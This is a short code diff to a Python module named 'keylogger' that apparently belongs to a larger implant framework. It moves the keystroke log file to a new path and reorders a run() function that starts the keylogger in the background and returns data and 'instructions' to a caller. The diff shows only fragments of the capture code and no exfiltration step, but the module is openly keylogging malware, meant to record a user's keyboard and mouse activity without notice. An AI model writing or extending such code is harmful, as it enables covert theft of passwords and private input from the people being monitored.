@@ -31,7 +31,7 @@ class keylogger():
         self.ewmh = EWMH()
 
         # Erases all the file content
-        self.keylog_txt_name = './outputs/keylog.txt'
+        self.keylog_txt_name = './media/keylog.txt'
         with open(self.keylog_txt_name, 'w'): pass
         
         # Starts the keyboard and mouse listeners
@@ -138,14 +138,14 @@ class keylogger():
 ###########################################################################################################################
 
 def run():
-    next_action = ""
-    data = "data"
-    print("[+] Keylogger module activated...")
-
+    # Starts the keylogger in the background
     keylogger()
 
+    print("[+] Keylogger module activated...")
+
+    return_data = "data"
     next_action = "instructions"
-    return data, next_action
+    return return_data, next_action
 
 if __name__ == '__main__':
     from time import sleep
